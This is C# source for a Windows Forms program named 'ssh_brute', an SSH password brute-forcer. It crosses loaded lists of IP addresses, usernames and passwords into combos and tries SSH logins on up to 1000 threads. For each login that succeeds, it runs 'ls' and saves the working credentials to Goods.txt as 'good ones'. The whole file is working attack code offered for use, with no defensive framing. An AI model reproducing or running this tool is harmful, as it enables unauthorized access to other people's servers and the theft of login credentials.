using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using Renci.SshNet;

namespace ssh_brute
{
    public partial class Form1 : Form
    {
        public static string _logins;
        public static string _passwords;
        public static string _ips;
        public static string _combos;
        public static List<string> threads = new List<string>();
        public static Thread thread0_start;
        public static Thread thread1_start;
        public static Thread thread2_start;

        public static int goods = 0;
        public static int bads = 0;

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Logins load";
                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                openFileDialog.ShowDialog();
                label1.Text = openFileDialog.FileName;
                _logins = openFileDialog.FileName;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Passwords load";
                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                openFileDialog.ShowDialog();
                label2.Text = openFileDialog.FileName;
                _passwords = openFileDialog.FileName;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "IPS load";
                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                openFileDialog.ShowDialog();
                label3.Text = openFileDialog.FileName;
                _ips = openFileDialog.FileName;
            }
        }

        public void combos_make()
        {
            listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add("Working")));
            int counter = 0;
            var logins_lines = File.ReadAllLines(_logins);
            var passwds_lines = File.ReadAllLines(_passwords);
            var ips_lines = File.ReadAllLines(_ips);
            for (int i = 0; i < ips_lines.Length; i++)
            {
                for (int j = 0; j< logins_lines.Length; j++)
                {
                    for (int k = 0; k < passwds_lines.Length; k++)
                    {
                        string combo = ips_lines[i] + "|" + logins_lines[j] + ":" + passwds_lines[k];
                        using (StreamWriter sw = File.AppendText("out.txt"))
                        {
                            sw.WriteLine(combo);
                            counter++;
                            if (counter % 10000 == 0)
                            {
                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                            }
                        }
                    }
                }
            }
            MessageBox.Show($"Ready -> {counter}");
        }

        private void button4_Click(object sender, EventArgs e)
        {
            thread0_start = new Thread(combos_make);
            thread0_start.Start();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Combos load";
                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                openFileDialog.ShowDialog();
                listBox1.Items.Clear();
                _combos = openFileDialog.FileName;
                listBox1.Items.Add($"Combos path ->{openFileDialog.FileName}");
            }
        }

        public void authorize(string combos_line, string thread_name)
        {
            string ip = combos_line.Split('|')[0].Split(':')[0];
            int port = int.Parse(combos_line.Split('|')[0].Split(':')[1]);
            string username = combos_line.Split('|')[1].Split(':')[0];
            string password = combos_line.Split('|')[1].Split(':')[1];
            PasswordConnectionInfo connectionInfo = new PasswordConnectionInfo(ip, port, username, password);
            listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Trying -> {ip} | {port} | {username} | {password}")));
            connectionInfo.Timeout = TimeSpan.FromSeconds(30);
            using (var client = new SshClient(connectionInfo))
            {
                try
                {
                    client.Connect();
                    if (client.IsConnected)
                    {
                        client.RunCommand("ls");
                        listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Good one -> {combos_line}")));
                        goods++;
                        label4.Invoke((MethodInvoker)(() => label4.Text = $"Goods: {goods}"));
                        using (StreamWriter sw = new StreamWriter("Goods.txt"))
                        {
                            sw.WriteLine(combos_line);
                        }
                    }
                    else 
                    {
                        bads++;
                        label5.Invoke((MethodInvoker)(() => label5.Text = $"Bads: {bads}"));
                    }
                }
                catch { }
            }
            threads.Remove(thread_name);
        }


        public void bruteforcing()
        {
            var combos_lines = File.ReadAllLines(_combos);
            for (int i = 0; i<File.ReadAllLines(_combos).Length; i++)
            {
                while (true)
                {
                    label6.Invoke((MethodInvoker)(() => label6.Text = $"Active threads: {threads.Count}"));
                    if (threads.Count >= 1000) { Thread.Sleep(10); }
                    else
                    {
                        string thread_name = $"Thread-{i}";
                        threads.Add(thread_name);
                        thread2_start = new Thread(() => authorize(File.ReadAllLines(_combos)[i], thread_name));
                        thread2_start.Start();
                        Thread.Sleep(50);
                        break;
                    }
                }
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            goods = 0;
            bads = 0;
            thread1_start = new Thread(bruteforcing);
            thread1_start.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            
            try { Thread.CurrentThread.Abort(); } catch { Application.Exit(); }
            try { threads.Clear(); } catch { }
            try { thread0_start.Abort(); } catch { }
            try { thread1_start.Abort(); } catch { }
            try { thread2_start.Abort(); } catch { }
        }
    }
}
